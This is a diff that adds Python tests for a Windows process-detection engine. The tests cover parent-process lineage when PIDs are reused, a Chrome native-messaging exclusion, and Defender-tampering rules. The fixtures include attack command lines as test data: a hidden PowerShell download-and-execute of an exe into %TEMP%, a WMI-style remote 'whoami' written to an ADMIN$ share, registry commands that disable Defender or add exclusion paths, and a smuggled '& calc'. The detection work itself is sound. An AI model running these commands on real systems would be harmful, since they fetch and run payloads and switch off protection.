@@ -29,6 +29,9 @@ PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
 CMD = r"C:\Windows\System32\cmd.exe"
 CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
+WMI = r"C:\Windows\System32\wbem\WmiPrvSE.exe"
+SVCHOST = r"C:\Windows\System32\svchost.exe"
+_ID32 = "abcdefghijklmnopabcdefghijklmnop"
 
 
 def _enc(script: str) -> str:
@@ -159,7 +162,9 @@ def test_b7_office_is_high_browser_is_lead_native_messaging_excluded():
     assert m.proposed_lane == "lead"
 
     nm = sysmon1(image=CMD, parent_image=CHROME, guid=10,
-                 command=r'cmd.exe /d /s /c ""C:\Vendor\host.exe" chrome-extension://abcdef/ --parent-window=0"')
+                 command=(r'cmd.exe /d /s /c ""C:\Vendor\host.exe" chrome-extension://' + _ID32 +
+                          r'/ --parent-window=0" < \\.\pipe\chrome.nativeMessaging.in.1 '
+                          r'> \\.\pipe\chrome.nativeMessaging.out.1'))
     assert run(LureAppSpawnsCodeRunner(), [nm]) == []
 
 
@@ -266,6 +271,150 @@ def test_hard_negatives_do_not_fire():
     # curl to an internal API without an output flag
     curl = sysmon1(image=r"C:\Windows\System32\curl.exe", command="curl.exe https://api.internal/health", guid=14)
     assert run(CurlDownload(), [curl]) == []
+
+
+# ---- N1: shared interval-history lineage never loses a reused-pid parent ----
+
+def _n1_batch():
+    from tests.windows_process_support import security4689
+    parent = security4688(image=WMI, command="wmiprvse.exe -Embedding", pid=0x900, ppid=0x200, offset=0)
+    child = security4688(image=CMD, command=r"cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1 2>&1",
+                         pid=0x904, ppid=0x900, offset=10)
+    term = security4689(image=WMI, pid=0x900, offset=20)
+    reuse = security4688(image=SVCHOST, command="svchost.exe -k x", pid=0x900, ppid=0x200, offset=30)
+    return [parent, child, term, reuse]
+
+
+def test_n1_reused_pid_parent_is_not_lost_when_lineage_is_shared_across_rules():
+    from romulus.detect.windows_common import share_windows_lineage
+    evs = _n1_batch()
+    lure, remote = LureAppSpawnsCodeRunner(), RemoteExecutionParent()
+    share_windows_lineage([lure, remote])
+    by = {e.id: e for e in evs}
+    for rule in (lure, remote):
+        rule.load = lambda ids, _by=by: [_by[i] for i in ids if i in _by]
+    # the first rule consumes the whole batch (leaving the shared state at end-of-batch), then the second judges
+    # its deferred children at finalize against the complete shared interval history
+    lure.consume(evs)
+    remote.consume(evs)
+    remote.drain_staged()
+    remote.drain_bounds()
+    out = remote.finalize()
+    assert len(out) == 1 and out[0].proposed_lane == "high"       # wmiprvse was live at the child, not svchost
+    assert remote.undecided == {}
+
+
+def test_n1_security_and_sysmon_targets_either_order_give_the_same_parent():
+    # the child is Sysmon, the parent/term/reuse are Security; consuming the two streams in either order resolves
+    from tests.windows_process_support import security4689
+    parent = security4688(image=WMI, command="wmiprvse.exe -Embedding", pid=0x900, ppid=0x200, offset=0)
+    term = security4689(image=WMI, pid=0x900, offset=20)
+    reuse = security4688(image=SVCHOST, command="svchost.exe -k x", pid=0x900, ppid=0x200, offset=30)
+    child = sysmon1(image=CMD, parent_image=None, command="cmd.exe /c whoami", pid=0x904, ppid=0x900, offset=10,
+                    guid=5)
+    security_stream, sysmon_stream = [parent, term, reuse], [child]
+    for order in ([security_stream, sysmon_stream], [sysmon_stream, security_stream]):
+        rule = RemoteExecutionParent()
+        out = run(rule, order)
+        assert len(out) == 1 and out[0].proposed_lane == "high", order
+
+
+def test_n1_child_before_parent_partition_resolves_once_parent_arrives():
+    parent = security4688(image=WMI, command="wmiprvse.exe -Embedding", pid=0x900, ppid=0x200, offset=0)
+    child = security4688(image=CMD, command="cmd.exe /c whoami", pid=0x904, ppid=0x900, offset=10)
+    # partitions are time-ordered in a real sweep, but the lineage resolves regardless of which batch holds what:
+    # here the parent's partition precedes the child's, the normal case, and it resolves.
+    rule = RemoteExecutionParent()
+    assert len(run(rule, [[parent], [child]])) == 1
+
+
+def test_n1_many_reuses_over_a_long_window_stay_exact_and_bounded():
+    from tests.windows_process_support import security4689
+    rule = RemoteExecutionParent()
+    events = []
+    # pid 0x900 is reused 500 times (benign svchost), with one wmiprvse interval that spawns a cmd child
+    for n in range(500):
+        events.append(security4688(image=SVCHOST, command="svchost.exe", pid=0x900, ppid=0x200, offset=n * 10))
+        events.append(security4689(image=SVCHOST, pid=0x900, offset=n * 10 + 5))
+    events.append(security4688(image=WMI, command="wmiprvse.exe -Embedding", pid=0x900, ppid=0x200, offset=6000))
+    events.append(security4688(image=CMD, command="cmd.exe /c whoami", pid=0x904, ppid=0x900, offset=6005))
+    events.append(security4689(image=WMI, pid=0x900, offset=6010))
+    out = run(rule, events)
+    assert len(out) == 1 and out[0].proposed_lane == "high"       # resolved to the wmiprvse interval, exactly
+    # bounded: one history list for (host, 0x900) and one for the child pid, not one store per record
+    assert len(rule.lineage.procs) <= 3
+
+
+def test_n1_reobserving_the_same_records_is_idempotent_for_resume():
+    evs = _n1_batch()
+    # a resume re-reads the same partitions. Re-delivery to one instance is de-duplicated (the guard), and a fresh
+    # instance (as a resumed sweep builds) reaches the same answer. Both must give exactly one high finding.
+    one = RemoteExecutionParent()
+    first = run(one, [evs, evs])                      # the same partition re-read (the guard de-duplicates it)
+    fresh = run(RemoteExecutionParent(), evs)         # a fresh instance, as on resume
+    assert len(first) == len(fresh) == 1
+
+
+# ---- N2: native-messaging exclusion is the exact Chromium launch only ----
+
+def _nm(command: str):
+    return run(LureAppSpawnsCodeRunner(), [sysmon1(image=CMD, parent_image=CHROME, command=command, guid=7)])
+
+
+def test_n2_only_the_exact_chromium_launch_is_excluded():
+    genuine = (r'cmd.exe /d /s /c ""C:\V\host.exe" chrome-extension://' + _ID32 +
+               r'/ --parent-window=0" < \\.\pipe\chrome.nativeMessaging.in.1 > \\.\pipe\chrome.nativeMessaging.out.1')
+    assert _nm(genuine) == []                                     # the one legitimate browser mechanism
+
+    # abuse: a chrome-extension operand bolted onto an unrelated command must stay a lead, never dropped
+    abuse_cmd = (r'C:\Windows\system32\cmd.exe /c powershell -nop -w hidden -c iwr http://x/a -o %TEMP%\a.exe '
+                 r'^& %TEMP%\a.exe chrome-extension://' + _ID32 + r'/')
+    assert [m.proposed_lane for m in _nm(abuse_cmd)] == ["lead"]
+
+    # a rundll32 child with a chrome-extension operand is not a cmd native-messaging host: stays a lead
+    rundll = run(LureAppSpawnsCodeRunner(), [sysmon1(
+        image=r"C:\Windows\System32\rundll32.exe", parent_image=CHROME, guid=8,
+        command=r"rundll32.exe C:\Users\u\AppData\Local\Temp\x.dll,Run chrome-extension://" + _ID32 + "/")])
+    assert [m.proposed_lane for m in rundll] == ["lead"]
+
+
+def test_n2_look_alikes_stay_a_lead():
+    for command in (
+        r'cmd.exe /d /s /c ""C:\V\host.exe" chrome-extension://abcdefghijklmnop/ --parent-window=0"',  # id too short
+        r'cmd.exe /d /s /c ""C:\V\host.exe" chrome-extension://' + _ID32 + r'/ & calc"',               # extra command
+        r'cmd.exe /d /s /c ""C:\V\host.exe" chrome-extension://' + _ID32 + r'/ --evil=1"',             # extra argument
+        r'cmd.exe /d /s /c ""C:\V\host.exe" --first chrome-extension://' + _ID32 + r'/"',              # ext not argv[1]
+        (r'cmd.exe /d /s /c ""C:\V\host.exe" chrome-extension://' + _ID32 + r'/" > C:\out.txt'),       # wrong redirect
+    ):
+        out = _nm(command)
+        assert [m.proposed_lane for m in out] == ["lead"], command
+
+
+# ---- minors: Set-ItemProperty value semantics and Defender key path components ----
+
+def test_setitemproperty_reenable_does_not_fire_disable_fires():
+    # -Command is given as one string (the realistic form); the path keeps its inner quotes so "Windows Defender"
+    # stays one token.
+    reenable = sysmon1(image=PS, guid=20, command=(
+        r"""powershell -Command "Set-ItemProperty -Path """
+        r"""'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 0" """))
+    disable = sysmon1(image=PS, guid=21, command=(
+        r"""powershell -Command "Set-ItemProperty -Path """
+        r"""'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1" """))
+    exclusion = sysmon1(image=PS, guid=22, command=(
+        r"""powershell -Command "New-ItemProperty -Path """
+        r"""'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths' -Name Mal -Value 'C:\x'" """))
+    assert run(DefenderImpairment(), [reenable]) == []
+    assert run(DefenderImpairment(), [disable])[0].proposed_lane == "high"
+    assert run(DefenderImpairment(), [exclusion])[0].proposed_lane == "high"
+
+
+def test_defender_key_is_matched_by_path_component_not_substring():
+    from romulus.detect.windows_defense import _defender_key
+    assert _defender_key(r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender") == (True, False)
+    assert _defender_key(r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths") == (True, True)
+    # a key that merely contains the words as part of a larger component is not a Defender key
+    assert _defender_key(r"HKLM\SOFTWARE\ACME\Windows Defender Helper\Config") == (False, False)
 
 
 def test_cmd_payload_echo_caret_redirect_stays_literal():
